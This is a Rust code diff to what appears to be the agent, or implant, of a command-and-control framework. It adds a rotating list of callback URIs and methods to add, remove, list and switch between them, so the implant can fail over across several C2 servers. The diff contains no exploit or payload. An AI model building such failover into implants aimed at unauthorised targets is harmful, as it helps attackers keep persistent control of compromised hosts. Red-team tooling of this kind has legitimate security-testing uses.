@@ -2,7 +2,7 @@ use anyhow::{Context, Result};
 use eldritch_libagent::agent::Agent;
 use pb::c2::{self, ClaimTasksRequest};
 use pb::config::Config;
-use std::collections::BTreeMap;
+use std::collections::{BTreeMap, BTreeSet};
 use std::sync::{Arc, Mutex};
 use tokio::sync::RwLock;
 use transport::Transport;
@@ -14,6 +14,8 @@ use crate::task::TaskRegistry;
 pub struct ImixAgent<T: Transport> {
     config: Arc<RwLock<Config>>,
     transport: Arc<RwLock<T>>,
+    callback_uris: Arc<RwLock<Vec<String>>>,
+    active_uri_idx: Arc<RwLock<usize>>,
     runtime_handle: tokio::runtime::Handle,
     pub task_registry: Arc<TaskRegistry>,
     pub subtasks: Arc<Mutex<BTreeMap<i64, tokio::task::JoinHandle<()>>>>,
@@ -27,9 +29,12 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
         runtime_handle: tokio::runtime::Handle,
         task_registry: Arc<TaskRegistry>,
     ) -> Self {
+        let uri = config.callback_uri.clone();
         Self {
             config: Arc::new(RwLock::new(config)),
             transport: Arc::new(RwLock::new(transport)),
+            callback_uris: Arc::new(RwLock::new(vec![uri])),
+            active_uri_idx: Arc::new(RwLock::new(0)),
             runtime_handle,
             task_registry,
             subtasks: Arc::new(Mutex::new(BTreeMap::new())),
@@ -89,8 +94,24 @@ impl<T: Transport + Sync + 'static> ImixAgent<T> {
 
     // Helper to get config URIs for creating new transport
     pub async fn get_transport_config(&self) -> (String, Option<String>) {
+        let uris = self.callback_uris.read().await;
+        let idx = *self.active_uri_idx.read().await;
+        let callback_uri = if idx < uris.len() {
+            uris[idx].clone()
+        } else {
+            // Fallback, should not happen unless empty
+            uris.first().cloned().unwrap_or_default()
+        };
         let cfg = self.config.read().await;
-        (cfg.callback_uri.clone(), cfg.proxy_uri.clone())
+        (callback_uri, cfg.proxy_uri.clone())
+    }
+
+    pub async fn rotate_callback_uri(&self) {
+        let uris = self.callback_uris.read().await;
+        let mut idx = self.active_uri_idx.write().await;
+        if !uris.is_empty() {
+            *idx = (*idx + 1) % uris.len();
+        }
     }
 
     // Helper to get a usable transport.
@@ -260,7 +281,8 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
             .block_on(async { Ok(self.config.read().await.clone()) })
             .map_err(|e: String| e)?;
 
-        map.insert("callback_uri".to_string(), cfg.callback_uri.clone());
+        let active_uri = self.get_active_callback_uri().unwrap_or_default();
+        map.insert("callback_uri".to_string(), active_uri);
         if let Some(proxy) = &cfg.proxy_uri {
             map.insert("proxy_uri".to_string(), proxy.clone());
         }
@@ -292,24 +314,22 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
         }
 
         self.block_on(async {
-            let mut cfg = self.config.write().await;
+            let mut uris = self.callback_uris.write().await;
+            let idx_val = *self.active_uri_idx.read().await;
 
-            // We need to update the scheme of the callback URI
-            let uri = &cfg.callback_uri;
-            if let Some(idx) = uri.find("://") {
-                let new_uri = format!("{}://{}", transport, &uri[idx + 3..]);
-                cfg.callback_uri = new_uri;
-            } else {
-                // Should not happen if uri is valid, but handle gracefully
-                let new_uri = format!("{}://{}", transport, uri);
-                cfg.callback_uri = new_uri;
+            // We update the current active URI with the new scheme
+            if idx_val < uris.len() {
+                let current_uri = &uris[idx_val];
+                if let Some(pos) = current_uri.find("://") {
+                     let new_uri = format!("{}://{}", transport, &current_uri[pos + 3..]);
+                     uris[idx_val] = new_uri;
+                } else {
+                     let new_uri = format!("{}://{}", transport, current_uri);
+                     uris[idx_val] = new_uri;
+                }
             }
             Ok(())
         })
-    }
-
-    fn add_transport(&self, _transport: String, _config: String) -> Result<(), String> {
-        Err("Adding transport not supported yet".to_string())
     }
 
     fn list_transports(&self) -> Result<Vec<String>, String> {
@@ -331,9 +351,76 @@ impl<T: Transport + Send + Sync + 'static> Agent for ImixAgent<T> {
     }
 
     fn set_callback_uri(&self, uri: String) -> Result<(), String> {
+        self.set_active_callback_uri(uri)
+    }
+
+    fn list_callback_uris(&self) -> Result<BTreeSet<String>, String> {
         self.block_on(async {
-            let mut cfg = self.config.write().await;
-            cfg.callback_uri = uri;
+            let uris = self.callback_uris.read().await;
+            Ok(uris.iter().cloned().collect())
+        })
+    }
+
+    fn get_active_callback_uri(&self) -> Result<String, String> {
+        self.block_on(async {
+            let uris = self.callback_uris.read().await;
+            let idx = *self.active_uri_idx.read().await;
+            if idx < uris.len() {
+                Ok(uris[idx].clone())
+            } else {
+                uris.first().cloned().ok_or_else(|| "No callback URIs configured".to_string())
+            }
+        })
+    }
+
+    fn get_next_callback_uri(&self) -> Result<String, String> {
+        self.block_on(async {
+            let uris = self.callback_uris.read().await;
+            let idx = *self.active_uri_idx.read().await;
+            if uris.is_empty() {
+                 return Err("No callback URIs configured".to_string());
+            }
+            let next_idx = (idx + 1) % uris.len();
+            Ok(uris[next_idx].clone())
+        })
+    }
+
+    fn add_callback_uri(&self, uri: String) -> Result<(), String> {
+        self.block_on(async {
+            let mut uris = self.callback_uris.write().await;
+            if !uris.contains(&uri) {
+                uris.push(uri);
+            }
+            Ok(())
+        })
+    }
+
+    fn remove_callback_uri(&self, uri: String) -> Result<(), String> {
+        self.block_on(async {
+            let mut uris = self.callback_uris.write().await;
+            if let Some(pos) = uris.iter().position(|x| *x == uri) {
+                uris.remove(pos);
+                // Adjust index if needed
+                let mut idx = self.active_uri_idx.write().await;
+                if *idx >= uris.len() && !uris.is_empty() {
+                    *idx = 0;
+                }
+            }
+            Ok(())
+        })
+    }
+
+    fn set_active_callback_uri(&self, uri: String) -> Result<(), String> {
+        self.block_on(async {
+            let mut uris = self.callback_uris.write().await;
+            let mut idx = self.active_uri_idx.write().await;
+
+            if let Some(pos) = uris.iter().position(|x| *x == uri) {
+                *idx = pos;
+            } else {
+                uris.push(uri);
+                *idx = uris.len() - 1;
+            }
             Ok(())
         })
     }
